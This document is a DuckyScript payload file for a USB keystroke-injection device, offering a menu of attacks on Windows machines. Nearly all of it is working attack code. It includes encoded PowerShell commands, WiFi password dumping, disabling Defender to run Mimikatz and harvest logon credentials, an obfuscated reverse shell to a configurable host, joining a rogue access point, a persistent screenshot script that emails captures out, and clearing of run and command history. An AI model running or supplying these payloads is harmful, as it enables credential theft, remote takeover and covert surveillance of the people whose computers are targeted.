REM #############################################################################
REM # DuckyScript 3.0                                                           #
REM # Title:                          _         _         _         _           #
REM #     duckin8or                 >(.)__    >(.)__    >(.)__    >(.)__        #
REM #                                (___/     (___/     (___/     (___/        #
REM # Author:                   _         _         _         _                 #
REM #     irrrwin            __(.)<    __(.)<    __(.)<    __(.)<               #
REM #                        \___)     \___)     \___)     \___)                #
REM # Compatibility:                                                            #
REM #     Windows                                                               #
REM #                                                                           #
REM # Description:                                                              #
REM #     Choose one from 3 attack vectors: (s)creen, (u)ser or (n)etwork and   #
REM #     run a (v)anilla or (h)ardcore version of it with a button press.      #
REM #     Vanilla attacks are not intrusive and only grab data. Hardcore stuff  #
REM #     may interfere with the system and change its state to insecure.       #
REM #     In addition, Help pop-up and ATTACKMODE STORAGE are available.        #
REM #                                                                           #
REM # Usage:                                                                    #
REM #     0. Insert Rubbing Duck.                                               #
REM #     1. Choose payload by using a combination of |C|aps Lock, |N|um Lock   #
REM #        and |S|croll Lock as 0(OFF)/1(ON) switches.                        #
REM #     2. Press button to run the chosen payload.                            #
REM #     3. After successful execution, lock keys will start blinking.         #
REM #     4. Press button again to reset lock keys and go back to menu.         #
REM #     5. Enjoy.                                                             #
REM #                                                                           #
REM # Payloads:                                                                 #
REM #     0) |-|-|-| [HELP] Help.                                               #
REM #     1) |-|-|S| [s][v] Proof of Pwnage pop-up and screenshot grab.         #
REM #     2) |-|N|-| [n][v] Network info exfiltration.                          #
REM #     3) |-|N|S| [u][h] Disable AV and fetch credentials with Mimikatz.     #
REM #     4) |C|-|-| [u][v] Open reverse shell with Powershell.                 #
REM #     5) |C|-|S| [n][h] Connect target to the rogue piña network.           #
REM #     6) |C|N|-| [s][h] Persistent screenshot exfiltration.                 #
REM #     7) |C|N|S| [STOR] Storage mode.                                       #
REM #                                                                           #
REM # Help:                                                                     #
REM #     0. Insert duckin8or.                                                  #
REM #     1. Press the button.                                                  #
REM #     2. Pop-up with brief payloads descriptions will appear.               #
REM #                                                                           #
REM # Tips:                                                                     #
REM #     * Start by filling out the >>> SETTINGS >>>>>> part.                  #
REM #     * First letters of the Lock Keys make it easier to remember payloads. #
REM #       F.e. to use (s)creen attack in vanilla mode press (S)croll Lock     #
REM #       only. To use it in hardcore mode, press the other two Lock Keys     #
REM #       instead. The same logic applies for (n)etwork attack and (N)um      #
REM #       Lock Key. For the (u)ser attacks, the (C)aps Lock is used.          #
REM #     * Each payload within the appropriate >> block << may be edited       #
REM #       or removed without breaking other features.                         #
REM #     * Any serious application requires a properly obfuscated mimikatz bin.#
REM #     * Be responsible.                                                     #
REM #                                                                           #
REM # Kudos:                                                                    #
REM #     * RootJunky   -   "Three Payloads from LOCK Key Double Press"         #
REM #     * 0i41E    -   "EngagementDucky", "ReverseDuckyII"                 #
REM #     * the-jcksn   -   "ducky_crab"                                        #
REM #     * I am Jakoby -   "-RD-PineApple"                                     #
REM #     * Hak5 Team                                                           #
REM #                                                                           #
REM # Disclaimer:                                                               #
REM #     *This program is free software: you can redistribute it and/or modify #
REM #     it under the terms of the GNU General Public License as published by  #
REM #     the Free Software Foundation, either version 3 of the License, or (at #
REM #     your option) any later version.*                                      #
REM #                                                                           #
REM #     *You should have received a copy of the GNU General Public License    #
REM #     along with this program. If not, see http://www.gnu.org/licenses/ *   #
REM #                                                                           #
REM #############################################################################



REM >>> SETTINGS >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
REM ~~~~~~~~~~~~ EDIT BELOW ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

DEFINE VID VID_D34D
DEFINE PID PID_B33F
DEFINE MAN MAN_Pentest
DEFINE PROD PROD_DUCKY
DEFINE SERIAL SERIAL_30062049

DEFINE CLEANUP FALSE

DEFINE LHOST 8.8.8.8
DEFINE LPORT 69
DEFINE BEACON icanhazip.com

DEFINE OUTLOOK_USER user@outlook.com
DEFINE OUTLOOK_PASS Password1!

DEFINE CRAB_DELAY_SEC 60
DEFINE CRAB_DURATION_MIN 10

DEFINE PINEAPPLE_SSID PineApple

REM ~~~~~~~~~~~~ EDIT ABOVE ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
REM <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< SETTINGS <<<


REM >>> SETUP >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

EXTENSION PASSIVE_WINDOWS_DETECT
    REM VERSION 1.0
    REM CONFIGURATION:
    DEFINE MAX_WAIT 150
    DEFINE CHECK_INTERVAL 20
    DEFINE WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE NOT_WINDOWS 7

    VAR $MAX_TRIES = MAX_WAIT
    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    ELSE
        $_OS = NOT_WINDOWS
    END_IF
END_EXTENSION

IF ($_OS == NOT_WINDOWS) THEN
    ATTACKMODE STORAGE
    WAIT_FOR_BUTTON_PRESS
    STOP_PAYLOAD
END_IF

BUTTON_DEF
    DELAY 20
END_BUTTON

ATTACKMODE HID
DELAY 1000

FUNCTION RESET_LOCKS()
    REM Set all Lock Keys to OFF position.
    IF ($_CAPSLOCK_ON == TRUE ) THEN
        CAPSLOCK
    END_IF
    IF ($_SCROLLLOCK_ON == TRUE ) THEN
        SCROLLLOCK
    END_IF
    IF ($_NUMLOCK_ON == TRUE ) THEN
        NUMLOCK
    END_IF
END_FUNCTION

RESET_LOCKS()

REM <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< SETUP <<<


REM >>> PAYLOAD 0 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
REM | Open pop-up window with the Lock Keys combos cheatsheet.

FUNCTION PAYLOAD0()
    DELAY 500
    GUI r
    DELAY 500
    STRINGLN powershell
    DELAY 500
    STRING $l = (
    STRING 'Choose payload -> Press one -> Press two -> Repeat',
    STRING 'P0 [-][-][-] : This window.',
    STRING 'P1 [-][-][N] : Network info.',
    STRING 'P2 [-][S][-] : Proof of Pwnage.',
    STRING 'P3 [-][S][N] : User credentials.',
    STRING 'P4 [C][-][-] : Reverse shell.',
    STRING 'P5 [C][-][N] : Ducky_crab.',
    STRING 'P6 [C][S][-] : Connect2pinapple.',
    STRING 'P7 [C][S][N] : Storage.')
    ENTER
    STRINGLN $l = $l -join "`n- "
    STRINGLN powershell -WindowStyle hidden -Command "& {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('- $l','~~~ duckin8or cheatsheet ~~~')}"
END_FUNCTION

REM <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< PAYLOAD 0 <<<


REM >>> PAYLOAD 1 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
REM | Open a proof of pwnage warning box and capture the screen. Save loot to REM | the SD card's root directyory

FUNCTION PAYLOAD1()
    ATTACKMODE HID STORAGE
    DELAY 5000

    GUI r
    DELAY 500
    STRINGLN powershell -NoP -NonI -w h
    DELAY 500

    STRINGLN powershell.exe -enc JABVACAAPQAgAHcAaABvAGEAbQBpADsAJABtAD0AIgAkAFUAIABpAHMAIABjAG8AbgBzAGkAZABlAHIAZQBkACAAYwBvAG0AcAByAG8AbQBpAHMAZQBkACEAIABUAGgAaQBzACAAaQBuAGMAaQBkAGUAbgB0ACAAdwBpAGwAbAAgAGIAZQAgAHIAZQBwAG8AcgB0AGUAZAAuACIAOwAkAEwAIAA9ACAARwBlAHQALQBEAGEAdABlAA0ACgBbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkAFcAaQB0AGgAUABhAHIAdABpAGEAbABOAGEAbQBlACgAIgBTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMAIgApADsAWwBTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMALgBNAGUAcwBzAGEAZwBlAEIAbwB4AF0AOgA6AFMAaABvAHcAKAAkAG0ALAAiACQATAAgAC0AIABQAHIAbwBvAGYAIABvAGYAIABDAG8AbQBwAHIAbwBtAGkAcwBlACIALAAwACwAWwBTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMALgBNAGUAcwBzAGEAZwBlAEIAbwB4AEkAYwBvAG4AXQA6ADoARQB4AGMAbABhAG0AYQB0AGkAbwBuACkA;exit
    DELAY 500

    GUI r
    DELAY 500
    STRINGLN powershell -NoP -NonI -w h
    DELAY 500

    STRINGLN powershell.exe -enc JABZACAAPQAoACgAZwB3AG0AaQAgAHcAaQBuADMAMgBfAHYAbwBsAHUAbQBlACAALQBmACAAJwBsAGEAYgBlAGwAPQAnACcARABVAEMASwBZACcAJwAnACkALgBOAGEAbQBlACkAOwANAAoAQQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgACoAbQAuACoAcwAuAEYAKgBzADsADQAKAEEAZABkAC0AdAB5AHAAZQAgAC0AQQBzAHMAZQBtAGIAbAB5AE4AYQBtAGUAIAAqAG0ALgBEAHIAKgBnADsADQAKACQAUwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAuAFMAeQBzAHQAZQBtAEkAbgBmAG8AcgBtAGEAdABpAG8AbgBdADoAOgBWAGkAcgB0AHUAYQBsAFMAYwByAGUAZQBuADsADQAKACQAVwAgAD0AIAAkAFMALgBXAGkAZAB0AGgAOwANAAoAJABIACAAPQAgACQAUwAuAEgAZQBpAGcAaAB0ADsADQAKACQARgAgAD0AIAAkAFMALgBMAGUAZgB0ADsADQAKACQAVAAgAD0AIAAkAFMALgBUAG8AcAA7AA0ACgAkAEIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwACAAJABXACwAIAAkAEgAOwANAAoAJABHACAAPQAgAFsAUwB5AHMAdABlAG0ALgBEAHIAYQB3AGkAbgBnAC4ARwByAGEAcABoAGkAYwBzAF0AOgA6AEYAcgBvAG0ASQBtAGEAZwBlACgAJABCACkAOwANAAoAJABHAC4AQwBvAHAAeQBGAHIAbwBtAFMAYwByAGUAZQBuACgAJABGACwAIAAkAFQALAAgADAALAAgADAALAAgACQAQgAuAFMAaQB6AGUAKQA7AA0ACgAkAEIALgBTAGEAdgBlACgAJABZACsAIgBcAFAAcgBvAG8AZgAuAGIAbQBwACIAKQA7ACQAUgBEACAAPQAgACgAZwB3AG0AaQAgAHcAaQBuADMAMgBfAHYAbwBsAHUAbQBlACAALQBmACAAJwBsAGEAYgBlAGwAPQAnACcARABVAEMASwBZACcAJwAnACkALgBOAGEAbQBlADsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAMwA7ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AYwBvAG0ATwBiAGoAZQBjAHQAIABTAGgAZQBsAGwALgBBAHAAcABsAGkAYwBhAHQAaQBvAG4AKQAuAE4AYQBtAGUAcwBwAGEAYwBlACgAMQA3ACkALgBQAGEAcgBzAGUATgBhAG0AZQAoACQAUgBEACkALgBJAG4AdgBvAGsAZQBWAGUAcgBiACgAJwBFAGoAZQBjAHQAJwApADsARQB4AGkAdAA=;exit
    DELAY 2000
    WAIT_FOR_STORAGE_INACTIVITY
END_FUNCTION

REM <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< PAYLOAD 1 <<<


REM >>> PAYLOAD 2 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
REM | Exfiltrate network data such as public IP, local IP and WiFi credentials.
REM | Save loot to the SD card's root directyory

FUNCTION PAYLOAD2()
    ATTACKMODE HID STORAGE
    DELAY 5000

    GUI r
    DELAY 500
    STRINGLN Powershell
    DELAY 500
    
    STRINGLN $pubIP=(Invoke-WebRequest icanhazip.com -UseBasicParsing).Content
    STRINGLN $networks = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | ? {$_.IPEnabled}
    STRINGLN $WiFi = Out-String -InputObject ((netsh wlan show profiles) | Select-String ":(.+)$" | % {$name=$_.Matches.Groups[1].Value.Trim(); $_} | % {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | % {$pass=$_.Matches.Groups[1].Value.Trim(); $_} | % {[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize) -Width 100
    DELAY 100
    STRINGLN $RD=((gwmi win32_volume -f 'label=''DUCKY''').Name + 'network.txt')
    DELAY 100
    STRINGLN ($WiFi + $pubIP + $networks.ipaddress[0]) | Set-Content -Path $RD
    DELAY 200
    STRINGLN exit
END_FUNCTION

REM <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< PAYLOAD 2 <<<


REM >>> PAYLOAD 3 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
REM | REQUIRES ADMIN PRIVILEGES. Exfiltrate users credentials with Mimikatz.
REM | Beware that Ducky will expose the drive and AV might pick up on any 
REM | potential threats. Save loot to the SD card's root directyory

FUNCTION PAYLOAD3()
    ATTACKMODE HID STORAGE
    DELAY 5000

    GUI r
    DELAY 500
    STRING powershell
    DELAY 500
    CTRL-SHIFT ENTER
    DELAY 500
    LEFT
    ENTER
    DELAY 500

    STRINGLN $RD = (gwmi win32_volume -f 'label=''DUCKY''').Name 
    DELAY 100
    STRINGLN Import-Module Defender
    DELAY 200
    STRINGLN Set-MpPreference -ExclusionPath $RD
    DELAY 100
    STRINGLN cd $RD
    DELAY 100
    STRINGLN .\mk.exe > $env:UserName`.txt -and type $env:UserName`.txt
    DELAY 1500
    STRINGLN privilege::debug
    DELAY 200
    STRINGLN sekurlsa::logonPasswords full
    DELAY 666
    STRINGLN exit
    DELAY 100
    STRINGLN Remove-MpPreference -ExclusionPath $RD
    DELAY 100
    STRINGLN exit
END_FUNCTION

REM <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< PAYLOAD 3 <<<


REM >>> PAYLOAD 4 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
REM | Open a simple TCP reverse shell through a powershell session.

FUNCTION PAYLOAD4()
    DELAY 500
    GUI r
    DELAY 500
    STRINGLN powershell -NoP -NonI -w h
    DELAY 500

    STRING $c=nEw-oBjECt SYstEm.NEt.SOcKEts.TCPClIEnt("
    STRING LHOST
    STRING ",
    STRING LPORT
    STRING  );$s=$c.GetSTreAm();[byte[]]$b=0..65535|%{0};whILe(($i=$s.REad($b,0,$b.LeNgTh))-ne 0){;$d=(NEw-OBjeCT -TYpeNamE sYsTeM.TeXt.ASCIIEncoding).GetStRIng($b,0,$i);$z=(ieX $d 2>&1|oUt-STriNG);$x=$z+"Ducky@PS "+(pwd)+"> ";$y=([text.encoding]::ASCII).GEtByTEs($x);$s.WrIte($y,0,$y.LEnGTh);$s.FlUSh()};$c.CloSE();exit
    ENTER
END_FUNCTION

REM <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< PAYLOAD 4 <<<


REM >>> PAYLOAD 5 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
REM | Prepare an XML file with rogue Pineapple credentials and connect to it.

FUNCTION PAYLOAD5()
    DELAY 500
    GUI r
    DELAY 500
    STRINGLN powershell
    DELAY 500

    STRING $f="Home.xml";
    STRING $SSID="
    STRING PINEAPPLE_SSID
    STRING ";
    STRING $SSIDHEX=($SSID.ToCharArray() |foreach-object {'{0:X}' -f ([int]$_)}) -join'';
    STRING $xmlfile="<?xml version=""1.0""?><WLANProfile xmlns=""http://www.microsoft.com/networking/WLAN/profile/v1""><name>$SSID</name><SSIDConfig><SSID><hex>$SSIDHEX</hex><name>$SSID</name></SSID></SSIDConfig><connectionType>ESS</connectionType><connectionMode>manual</connectionMode><MSM><security><authEncryption><authentication>open</authentication><encryption>none</encryption><useOneX>false</useOneX></authEncryption></security></MSM></WLANProfile>";$XMLFILE > ($f);netsh wlan add profile filename="$($f)";netsh wlan connect name=$SSID;exit
    ENTER
END_FUNCTION

REM <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< PAYLOAD 5 <<<


REM >>> PAYLOAD 6 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
REM | Gives "screen crab" like capabilities to the USB rubber ducky. Creates a 
REM | powershell script that captures screenshots and exfiltrates them via outlook,
REM | even after the USB rubber ducky has been removed.

FUNCTION PAYLOAD6()
    DELAY 500
    GUI r
    DELAY 500
    STRINGLN powershell
    DELAY 200
    STRINGLN Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
    DELAY 200

    STRINGLN New-Item -Path 'Pictures' -Name 'screens.ps1' -ItemType file
    DELAY 200

    STRINGLN "cd C:\Users\$env:username\ `nNew-Item -Path 'C:\Users\$env:username\Pictures\Screens\' -ItemType Directory" | Out-File Pictures\screens.ps1 -Append
    DELAY 200

    STRING "`$t = new-timespan -Minutes 
    STRING CRAB_DURATION_MIN
    STRING " | Out-File Pictures\screens.ps1 -Append
    ENTER
    DELAY 200

    STRINGLN "`$clk = [diagnostics.stopwatch]::StartNew() `nwhile (`$clk.elapsed -lt `$t){ `n[void][reflection.assembly]::loadwithpartialname('system.windows.forms') `n`$S = [System.Windows.Forms.SystemInformation]::VirtualScreen `n`$Width = `$S.Width `n`$Height = `$S.Height `n`$Left = `$S.Left `n`$Top = `$S.top `n`$bmp = New-Object System.Drawing.Bitmap `$Width, `$Height `n`$g = [System.Drawing.Graphics]::FromImage(`$bmp) `n`$g.CopyFromScreen(`$Left, `$Top, 0, 0, `$bmp.Size) `n`$enddate = (Get-Date).tostring('ddMMyy-hh_mm_ss') `n`$fn = `$enddate + '.gif' `n`$bmp.Save('C:\Users\$env:Username\Pictures\Screens\' + `$fn) `nstart-sleep -seconds 10" | Out-File Pictures\screens.ps1 -Append
    DELAY 200

    STRING "Send-MailMessage -From
    STRING  OUTLOOK_USER
    STRING  -To
    STRING  OUTLOOK_USER
    STRING  -Subject `"Screenshot loot`" -Body `"Please find attached your screenshot update`" -Attachment `"Pictures\Screens\`$fn`" -SmtpServer smtp-mail.outlook.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList
    STRING  OUTLOOK_USER
    STRING , (ConvertTo-SecureString -String `"
    STRING OUTLOOK_PASS
    STRING `" -AsPlainText -Force))" | Out-File Pictures\screens.ps1 -Append
    ENTER
    DELAY 200

    STRING "start-sleep -seconds 
    STRING CRAB_DELAY_SEC
    STRING  `n} `nSet-ExecutionPolicy -ExecutionPolicy Undefined -Scope CurrentUser `nGet-ChildItem Pictures\Screens -Include *.* -Recurse | ForEach {`$_.Delete()} `nRemove-Item Pictures\screens -Confirm:`$false `nRemove-Item Pictures\screens.ps1 -Force `nexit" | Out-File Pictures\screens.ps1 -Append
    ENTER
    DELAY 200
    STRINGLN exit
    DELAY 300
    
    REM Run the prepared script.
    GUI r
    DELAY 500
    STRINGLN powershell -w h -File "%USERPROFILE%\Pictures\screens.ps1"
    DELAY 1000
END_FUNCTION

REM <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< PAYLOAD 6 <<<


REM >>> PAYLOAD 7 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
REM | Storage mode. Press button to stop sharing.

FUNCTION PAYLOAD7()
    ATTACKMODE STORAGE
    DELAY 5000
    WAIT_FOR_BUTTON_PRESS
    $_BUTTON_PUSH_RECEIVED = FALSE
END_FUNCTION

REM <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< PAYLOAD 7 <<<


REM >>> MAIN >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
REM | Constantly monitor Scroll Lock, Num Lock, and Caps Lock keys with a while
REM | loop and run appropriate payload when the button is pressed. All Lock keys
REM | will blink when finished. Press again to go back to menu.

WHILE (TRUE)
    IF ($_BUTTON_PUSH_RECEIVED == TRUE ) THEN
        DELAY 100
        $_BUTTON_PUSH_RECEIVED = FALSE
        DISABLE_BUTTON
        SAVE_ATTACKMODE
        
        IF (($_CAPSLOCK_ON == FALSE) && (($_NUMLOCK_ON == FALSE) && ($_SCROLLLOCK_ON == FALSE))) THEN
            RESET_LOCKS()
            PAYLOAD0()
        ELSE IF (($_CAPSLOCK_ON == FALSE) && (($_NUMLOCK_ON == FALSE) && ($_SCROLLLOCK_ON == TRUE))) THEN
            RESET_LOCKS()
            PAYLOAD1()
        ELSE IF (($_CAPSLOCK_ON == FALSE) && (($_NUMLOCK_ON == TRUE) && ($_SCROLLLOCK_ON == FALSE))) THEN
            RESET_LOCKS()
            PAYLOAD2()
        ELSE IF (($_CAPSLOCK_ON == FALSE) && (($_NUMLOCK_ON == TRUE) && ($_SCROLLLOCK_ON == TRUE))) THEN
            RESET_LOCKS()
            PAYLOAD3()
        ELSE IF (($_CAPSLOCK_ON == TRUE) && (($_NUMLOCK_ON == FALSE) && ($_SCROLLLOCK_ON == FALSE))) THEN
            RESET_LOCKS()
            PAYLOAD4()
        ELSE IF (($_CAPSLOCK_ON == TRUE) && (($_NUMLOCK_ON == FALSE) && ($_SCROLLLOCK_ON == TRUE))) THEN
            RESET_LOCKS()
            PAYLOAD5()
        ELSE IF (($_CAPSLOCK_ON == TRUE) && (($_NUMLOCK_ON == TRUE) && ($_SCROLLLOCK_ON == FALSE))) THEN
            RESET_LOCKS()
            PAYLOAD6()
        ELSE IF (($_CAPSLOCK_ON == TRUE) && (($_NUMLOCK_ON == TRUE) && ($_SCROLLLOCK_ON == TRUE))) THEN
            RESET_LOCKS()
            PAYLOAD7()
        END_IF

        RESTORE_ATTACKMODE
        DELAY 1000

        IF (CLEANUP == TRUE) THEN
            GUI r
            DELAY 500
            STRINGLN powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"; Remove-Item (Get-PSreadlineOption).HistorySavePath
        END_IF

        ENABLE_BUTTON
        RESET_LOCKS()
        $_BUTTON_PUSH_RECEIVED = FALSE
        DELAY 100
        WHILE ($_BUTTON_PUSH_RECEIVED == FALSE )
            DELAY 100
            CAPSLOCK
            SCROLLLOCK
            NUMLOCK
            DELAY 100
            CAPSLOCK
            SCROLLLOCK
            NUMLOCK
        END_WHILE
        $_BUTTON_PUSH_RECEIVED = FALSE
        DELAY 100
        RESET_LOCKS()
        DELAY 100
    END_IF
END_WHILE

REM <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< MAIN <<<